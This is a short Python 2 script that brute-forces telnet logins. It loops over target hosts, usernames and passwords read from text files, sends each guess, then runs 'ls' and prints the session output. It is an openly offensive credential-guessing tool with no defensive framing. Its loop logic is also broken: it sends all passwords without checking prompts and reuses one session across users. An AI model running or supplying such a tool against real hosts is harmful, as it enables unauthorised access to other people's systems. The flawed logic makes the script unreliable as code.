import getpass
import sys
import telnetlib

with open("targets.txt") as targets:							#List targets
	for target in targets:									#Loop targets
		tn = telnetlib.Telnet(target)							#Make telnet socket
		tn.read_until("login: ")							
		with open("users.txt") as users:						#List users
			for user in users:								#Loop users
				tn.write(user + "\n")						#Write user
				tn.read_until("Password: ")					#Wait for password prompt
				with open("passwords.txt") as passwords:		#List passwords
					for password in passwords:				#Loop passwords
						tn.write(password + "\n")			#Use password
					tn.write("ls\n")						#ls
					tn.write("exit\n")						#exit
					print tn.read_all()						